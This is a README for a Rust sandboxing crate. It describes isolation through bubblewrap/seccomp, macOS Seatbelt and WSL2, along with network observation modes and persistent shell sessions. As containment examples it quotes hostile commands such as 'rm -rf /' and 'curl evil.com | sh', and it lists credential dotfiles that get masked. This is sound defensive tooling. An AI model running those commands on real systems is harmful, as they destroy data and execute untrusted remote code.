# tokimo-package-sandbox

[![Crates.io](https://img.shields.io/crates/v/tokimo-package-sandbox.svg)](https://crates.io/crates/tokimo-package-sandbox)
[![Docs.rs](https://docs.rs/tokimo-package-sandbox/badge.svg)](https://docs.rs/tokimo-package-sandbox)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)

A cross-platform Rust sandbox for running arbitrary commands without affecting the host.

Give it a command like `rm -rf /`, `curl evil.com | sh`, or a full interactive `bash` — the host filesystem, network, and process table are safe.

> **Crate name:** `tokimo-package-sandbox`
> **Crate & library name match:** `tokimo-package-sandbox` (import as `use tokimo_package_sandbox::…`).

## Isolation strategy

| OS | Mechanism | Level |
|---|---|---|
| Linux | **bubblewrap** (user / mount / pid / net / uts namespaces) + **seccomp BPF** + POSIX rlimits | strong |
| Linux (fallback) | **firejail** + rlimits | medium |
| macOS | **sandbox-exec** with a generated Seatbelt profile + rlimits | strong (Apple-supported) |
| Windows | Re-executes inside **WSL2** under bubblewrap | strong (VM + Linux sandbox) |

Every `run()` invocation is a one-shot process tree inside a fresh set of namespaces — not a long-running container. When the command exits, the namespaces vanish. For commands that must share state (env, cwd, files, background jobs) across calls, use [`Session`](#persistent-sessions).

## Install

```toml
[dependencies]
tokimo-package-sandbox = "0.1"
```

System prerequisites:

- **Linux**: `sudo apt install bubblewrap` (or `dnf install bubblewrap`). `firejail` works as a fallback.
- **macOS**: nothing. `sandbox-exec` ships with the OS.
- **Windows**: `wsl --install` then inside WSL, `sudo apt install -y bubblewrap`.

## Quick start

```rust
use tokimo_package_sandbox::{SandboxConfig, NetworkPolicy};

fn main() -> anyhow::Result<()> {
    let work = tempfile::tempdir()?;

    let cfg = SandboxConfig::new(work.path())
        .network(NetworkPolicy::Blocked);

    let out = tokimo_package_sandbox::run(&["rm", "-rf", "/"], &cfg)?;

    println!("exit: {}", out.exit_code);
    println!("stdout: {}", out.stdout);
    println!("stderr: {}", out.stderr);
    Ok(())
}
```

Your host filesystem is untouched.

## API

```rust
pub fn run<S: AsRef<str>>(cmd: &[S], cfg: &SandboxConfig) -> Result<ExecutionResult>;

pub struct SandboxConfig {
    pub name: String,
    pub work_dir: PathBuf,
    pub extra_mounts: Vec<Mount>,
    pub network: NetworkPolicy,
    pub limits: ResourceLimits,
    pub env: Vec<(OsString, OsString)>,
    pub stdin: Option<Vec<u8>>,
    pub cwd: Option<PathBuf>,
    pub stream_stderr: bool,
}

pub struct Mount { pub host: PathBuf, pub guest: Option<PathBuf>, pub read_only: bool }

pub enum NetworkPolicy {
    /// No network at all (default). Guest runs in an empty netns.
    Blocked,
    /// Full host network. Use only for trusted workloads.
    AllowAll,
    /// Linux. Full network + every HTTP/HTTPS request and every raw TCP/UDP
    /// `connect()` / `sendto()` is reported to `sink`. Advisory only —
    /// nothing is blocked. See `docs/network-observability.md`.
    Observed { sink: Arc<dyn NetEventSink> },
    /// Linux. Same as `Observed` plus host allowlist enforcement at L7 and
    /// (where supported) at L4 via `Verdict::Deny`.
    Gated {
        sink: Arc<dyn NetEventSink>,
        allow_hosts: Vec<HostPattern>,
        dns_policy: DnsPolicy,
    },
}

pub struct ResourceLimits {
    pub max_memory_mb: u64,
    pub timeout_secs: u64,
    pub max_file_size_mb: u64,
    pub max_processes: u64,
}

pub struct ExecutionResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub timed_out: bool,
    pub oom_killed: bool,
}
```

Builder style is supported for every field:

```rust
SandboxConfig::new(work_dir)
    .name("build")
    .network(NetworkPolicy::Blocked)
    .limits(ResourceLimits { max_memory_mb: 256, timeout_secs: 30, max_file_size_mb: 16, max_processes: 64 })
    .mount(Mount::ro("/opt/cache"))
    .mount(Mount::rw("/host/output").guest("/out"))
    .env("LANG", "C.UTF-8")
    .stdin_str("hello")
    .cwd("/tmp")
    .stream_stderr(true);
```

## What the Linux sandbox blocks

- `mount` / `umount` / `pivot_root` / `chroot` (seccomp)
- `ptrace` / `keyctl` / `kexec_load` (seccomp)
- `socket(AF_UNIX)` — no talking to host daemons
- `CLONE_NEWUSER` nesting
- All filesystem writes outside the configured `work_dir`
- Network, when `NetworkPolicy::Blocked` is used (default)
- Memory (`RLIMIT_AS`), CPU seconds (`RLIMIT_CPU`), output file size (`RLIMIT_FSIZE`)
- Wall-clock timeout (monitor thread SIGTERM → SIGKILL)

Sensitive host dotfiles (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.config`, `~/.npmrc`, `~/.netrc`, various credentials) are tmpfs-blanked even if the user accidentally mounts `$HOME`.

## Examples

```bash
# Sanity check: runs `ls -la /` inside the sandbox.
cargo run --example basic

# Proves host safety: tries `rm -rf /` and `rm -rf $HOME` inside sandbox,
# verifies host canary files still exist.
cargo run --example rm_rf_test

# Interactive bash shell inside the sandbox (`docker run -it` style).
cargo run --example shell

# Persistent session: open once, run many commands sharing state, close.
cargo run --example session

# Network observability: HTTP_PROXY-based L7 tap (curl/pip/wget visible).
cargo run --example gated_network

# Full L4 + L7 observer: every raw connect() / sendto() in the guest
# is reported with (remote, pid, comm), plus HTTP/SNI from the proxy.
cargo run --example l4_observer
```

## Network observability

Four network modes cover the common scenarios. Pick by what you need to
*see* and what you need to *block*.

| Mode | Reachable network | What the host sees | What the host can block | Linux cost | Use when |
|---|---|---|---|---|---|
| `Blocked` (default) | nothing | — | everything | 0 | build / test that must be hermetic |
| `AllowAll` | full host net | nothing | nothing | 0 | trusted workloads, perf-sensitive |
| `Observed { sink }` | full host net | every HTTP(S) request + every raw `connect()` / `sendto()` (remote IP:port, pid, comm, SNI, method, URL) | nothing (advisory) | L7 proxy + seccomp filter (~µs/syscall) | auditing an untrusted installer, "what did this script phone home to?" |
| `Gated { sink, allow_hosts, .. }` | full host net, filtered | same as `Observed` | unknown hosts get `403` at L7; `Verdict::Deny` from sink blocks L4 connects (when the backend supports it) | same as Observed | letting an agent `pip install` from pypi.org but nothing else |

Under the hood the Linux implementation layers three mechanisms and
auto-selects based on what the kernel supports:

| Layer | Mechanism | Covers | Needs |
|---|---|---|---|
| **L7** | transparent `HTTP_PROXY` inside the sandbox | HTTP method/URL + TLS SNI | nothing extra; tools that honor `HTTP_PROXY` |
| **L4 primary** | `seccomp(SECCOMP_FILTER_FLAG_NEW_LISTENER)` + user-notify | any `connect()` / `sendto()`, synchronous deny | mainline kernel, no inherited seccomp filter |
| **L4 fallback** | `SECCOMP_RET_TRACE` + `PTRACE_SEIZE` | same syscalls, observe-only | works on WSL2 and any container that already installed a seccomp notifier |

L7 and L4 events are joined: the "client → proxy" L4 hop is suppressed,
and the L7 event is enriched with `pid`/`comm` via `/proc/net/tcp`
reverse-lookup, so one real request is one `NetEvent`.

See [`docs/network-observability.md`](./docs/network-observability.md)
for the full design and [`examples/l4_observer.rs`](./examples/l4_observer.rs)
for a runnable end-to-end demo (`python`, `bash /dev/tcp`, `nc`, `curl`
all produce events).

## Persistent sessions

When you need to run **multiple commands that share state** — files, env vars, cwd, background jobs — open a `Session` instead of calling `run()` each time.

```rust
use tokimo_package_sandbox::{SandboxConfig, Session};

let cfg = SandboxConfig::new("/tmp/work");
let mut sess = Session::open(&cfg)?;

sess.exec("touch hello")?;                    // create file
let out = sess.exec("ls")?;                   // file is still there
assert!(out.stdout.contains("hello"));

sess.exec("export FOO=bar")?;
let out = sess.exec("echo $FOO")?;
assert_eq!(out.stdout.trim(), "bar");

sess.exec("cd /tmp && mkdir -p sub && cd sub")?;
let out = sess.exec("pwd")?;
assert!(out.stdout.contains("/sub"));         // cwd persists too

sess.close()?;
```

Under the hood: a long-running `bash --noprofile --norc` runs inside the sandbox with stdin/stdout/stderr piped. Each `exec()` writes the command followed by a randomized sentinel and waits for the sentinel to come back. Same isolation as `run()` — same bwrap / Seatbelt / WSL backend — just kept alive across calls.

You still get `exit_code`, `stdout`, `stderr` per call.

## Why not Docker?

Docker is a good answer for "I want a reproducible runtime". It is a heavy answer for "I want to run one untrusted command".

- no daemon, no images, no VM
- ~200 KB runtime dependency (`bwrap`)
- startup in tens of milliseconds
- Rust-native API, no subprocess shelling from your program to `docker run`
- reuses the host's `/usr`, `/bin`, `/lib` read-only, so tools are whatever the host has

Not a Docker replacement. A sharper tool for a narrower job.

## Why not pure Rust?

No kernel cooperation means no real isolation. The three mechanisms used here (Linux namespaces + seccomp, macOS Seatbelt, Windows WSL2) are all operating-system facilities with decades of production use and dedicated security audit. Re-implementing them in userspace Rust would be both a massive effort and a downgrade in assurance.

## Caveats

- Linux seccomp syscall tables are shipped for **x86_64** and **aarch64**. Other architectures still get bwrap's namespace isolation, but no syscall filtering.
- On Windows, running natively (without WSL2) is refused. Windows Job Objects do not provide comparable filesystem isolation.
- Setting `SAFEBOX_DISABLE=1` in the environment bypasses the sandbox. Debug/testing only.

## Documentation

- [`docs/db-as-filesystem.md`](./docs/db-as-filesystem.md) — pattern for exposing a database as a filesystem to sandboxed bash (materialize + diff-and-commit on exit)
- [`docs/network-observability.md`](./docs/network-observability.md) — design + backend selection for `Observed` / `Gated` network modes
- [`docs/api.md`](./docs/api.md) — extended API reference

## License

MIT. See [LICENSE](./LICENSE).
